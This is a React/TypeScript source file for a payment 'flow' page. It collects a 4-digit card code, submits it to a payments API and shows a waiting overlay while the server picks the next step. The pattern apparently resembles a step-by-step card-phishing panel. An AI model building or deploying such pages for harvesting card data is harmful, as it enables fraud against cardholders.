import { useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { CreditCard } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

const LENGTH = 4;

export function FlowCardCodePage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [digits, setDigits] = useState<string[]>(new Array(LENGTH).fill(""));
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const refs = useRef<Array<HTMLInputElement | null>>(
    new Array(LENGTH).fill(null),
  );

  useFlowPoll({
    reference,
    currentPage: "card-code",
    enabled: submitted && !!reference,
  });

  const handleInput = (i: number, val: string) => {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < LENGTH - 1) refs.current[i + 1]?.focus();
  };

  const handleKeyDown = (
    i: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    if (e.key === "Backspace" && !digits[i] && i > 0)
      refs.current[i - 1]?.focus();
  };

  const handleSubmit = async () => {
    const card_code = digits.join("");
    if (card_code.length < LENGTH) {
      setError("Please enter all 4 digits");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "card_code_submitted", {
        card_code,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <CreditCard size={44} color="#8b1a3a" />
        </div>

        <p className={styles.flowTitle}>Card Code</p>
        <p className={styles.flowSubtitle}>
          Enter the 4-digit code from your card
        </p>

        <div className={styles.otpGroup}>
          {digits.map((d, i) => (
            <input
              key={`digit-${i}`}
              ref={(el) => {
                refs.current[i] = el;
              }}
              className={styles.otpBox}
              type="tel"
              inputMode="numeric"
              maxLength={1}
              value={d}
              onChange={(e) => handleInput(i, e.currentTarget.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
            />
          ))}
        </div>

        {error && <div className={styles.formError} style={{ textAlign: "center" }}>{error}</div>}

        <button
          className={styles.submitBtn}
          onClick={handleSubmit}
          disabled={busy || submitted}
        >
          {busy ? "Submitting…" : "Submit"}
        </button>
      </div>

      {submitted && (
        <div className={styles.loadingOverlay}>
          <div className={styles.loadingCard}>
            <div className={styles.spinnerWrap}>
              <div className={styles.spinnerOuter} />
              <div className={styles.spinnerInner} />
            </div>
            <p className={styles.loadingTitle}>Please wait</p>
            <p className={styles.loadingSubtitle}>
              Processing your information
            </p>
            <div className={styles.loadingNoteBox}>
              <p className={styles.loadingNote}>
                Please do not leave or refresh this page until the process is
                complete
              </p>
            </div>
            <div className={styles.dots}>
              <span className={styles.dot} />
              <span className={styles.dotActive} />
              <span className={styles.dot} />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
